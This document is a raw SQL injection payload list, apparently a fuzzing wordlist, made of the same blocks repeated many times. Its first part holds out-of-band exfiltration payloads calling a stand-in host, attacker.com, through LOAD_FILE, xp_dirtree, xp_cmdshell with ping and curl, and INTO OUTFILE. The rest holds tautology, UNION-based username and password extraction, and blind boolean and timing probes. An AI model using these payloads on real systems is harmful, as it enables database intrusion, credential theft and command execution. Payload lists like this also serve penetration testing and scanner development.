+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--
+'; EXEC xp_dirtree '\\attacker.com\data'--
+'; EXEC xp_fileexist '\\attacker.com\check'--
+' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--
+'; exec master..xp_dirtree '\\attacker.com\data'--
+'; exec master..xp_fileexist '\\attacker.com\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--
+' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
+' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' AND '1'='1' --
+' AND '1'='1' #
+' AND '1'='1' /*
+' UNION SELECT NULL --
+' UNION SELECT NULL #
+' UNION SELECT NULL /*
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL FROM information_schema.tables #
+' UNION SELECT 1,2 WHERE DATABASE()='test_db' --
+' AND IF(1=1, 'true', 'false') --
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --
+' AND LENGTH(DATABASE())>5 #
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --
+' AND 1=IF((SELECT DATABASE())='test',1,0) --
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
